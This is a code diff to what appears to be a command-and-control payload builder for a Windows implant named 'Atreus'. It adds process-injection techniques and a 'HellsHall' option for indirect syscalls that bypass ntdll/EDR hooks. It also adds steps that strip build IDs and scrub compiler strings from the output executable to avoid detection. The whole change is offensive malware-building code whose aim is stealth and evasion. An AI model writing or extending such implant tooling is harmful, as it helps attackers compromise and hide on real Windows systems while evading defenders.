@@ -103,13 +103,19 @@ class Atreus(PayloadType):
             name="injection_technique",
             parameter_type=BuildParameterType.ChooseOne,
             description="Injection technique: Early Bird APC (new suspended process), Thread Hijack (RIP redirect), Process Hollowing (unmap + RIP), or Remote Thread (NtCreateThreadEx in existing process - target_process must be a process name like svchost.exe)",
-            choices=["self_injection", "fiber_injection", "module_stomping", "remote_injection", "thread_hijacking", "early_bird_apc", "process_hollowing"],
+            choices=["self_injection", "fiber_injection", "module_stomping", "remote_injection", "thread_hijacking", "early_bird_apc", "process_hollowing", "local_map_inject", "remote_map_inject", "func_stomp"],
             default_value="early_bird_apc",
         ),
         BuildParameter(
             name="wipe_memory",
             parameter_type=BuildParameterType.Boolean,
             description="Zero payload in heap after injection",
+            default_value=True,
+        ),
+        BuildParameter(
+            name="use_hellshall",
+            parameter_type=BuildParameterType.Boolean,
+            description="HellsHall: SSN resolution + indirect syscalls bypass ntdll hooks (replaces ntdll remapping)",
             default_value=True,
         ),
         BuildParameter(
@@ -142,6 +148,7 @@ class Atreus(PayloadType):
         use_sandbox      = self.get_parameter("use_sandbox_check") or False
         injection_technique = self.get_parameter("injection_technique") or "early_bird_apc"
         wipe_memory      = self.get_parameter("wipe_memory") or False
+        use_hellshall    = self.get_parameter("use_hellshall") or False
         debug_mode       = self.get_parameter("debug_mode") or False
 
         # Generate key (unused for uuid mode)
@@ -285,8 +292,16 @@ class Atreus(PayloadType):
             defines.append("-DUSE_FIBER_INJECT")
         elif injection_technique == "module_stomping":
             defines.append("-DUSE_MODULE_STOMP")
+        elif injection_technique == "local_map_inject":
+            defines.append("-DUSE_LOCAL_MAP_INJECT")
+        elif injection_technique == "remote_map_inject":
+            defines.append("-DUSE_REMOTE_MAP_INJECT")
+        elif injection_technique == "func_stomp":
+            defines.append("-DUSE_FUNC_STOMP")
         if wipe_memory:
             defines.append("-DUSE_WIPE")
+        if use_hellshall:
+            defines.append("-DUSE_HELLSHALL")
 
         extra_libs = ""
         if debug_mode:
@@ -299,21 +314,32 @@ class Atreus(PayloadType):
         logging.error(f"[ATREUS-DEBUG] defines = {defines}")
 
         with tempfile.TemporaryDirectory() as tmp:
-            src_path = os.path.join(tmp, "Atreus_Main.cpp")
-            exe_path = os.path.join(tmp, "Atreus.exe")
+            src_path  = os.path.join(tmp, "Atreus_Main.cpp")
+            exe_path  = os.path.join(tmp, "Atreus.exe")
+            stub_path = os.path.join(tmp, "syscall_stub_atreus.S")
+            hg_path   = os.path.join(tmp, "hellshall.hpp")
             with open(src_path, "w") as f:
                 f.write(src)
 
+            # Copy HellsHall support files into tmp dir when needed
+            if use_hellshall:
+                import shutil
+                shutil.copy(str(self.agent_code_path / "syscall_stub_atreus.S"), stub_path)
+                shutil.copy(str(self.agent_code_path / "hellshall.hpp"), hg_path)
+
             if debug_mode:
-                subsystem = ""       # console subsystem - main() entry point
-                opt_flags = "-O0"    # no strip, no optim for readability
+                subsystem = "-mwindows"  # windowless + file logging to %TEMP%\atreus_debug.log
+                opt_flags = "-O0 -g"     # no strip, debug symbols for crash analysis
             else:
                 subsystem = "-mwindows -s"
                 opt_flags = "-O2"
+
+            extra_src = f" {stub_path}" if use_hellshall else ""
             cmd = (
-                f"x86_64-w64-mingw32-g++ {src_path} -o {exe_path} "
+                f"x86_64-w64-mingw32-g++ {src_path}{extra_src} -o {exe_path} "
                 f"-std=c++17 {opt_flags} {subsystem} -lntdll -static "
-                f"-fno-exceptions -fno-rtti -w "
+                f"-fno-exceptions -fno-rtti -fno-ident -w "
+                f"-Wl,--build-id=none "
                 f"{' '.join(defines)} {extra_libs}"
             )
             proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -327,6 +353,15 @@ class Atreus(PayloadType):
                     f"StdOut: {stdout.decode()}"
                 )
                 return resp
+
+            # Scrub GCC version strings from .rdata (MinGW embeds them in static libs)
+            with open(exe_path, "rb") as f:
+                pe_bytes = bytearray(f.read())
+            import re as _re
+            for m in _re.finditer(rb'GCC: \([^)]+\)[^\x00]*\x00', pe_bytes):
+                pe_bytes[m.start():m.end()] = b'\x00' * (m.end() - m.start())
+            with open(exe_path, "wb") as f:
+                f.write(pe_bytes)
 
             with open(exe_path, "rb") as f:
                 resp.payload = f.read()
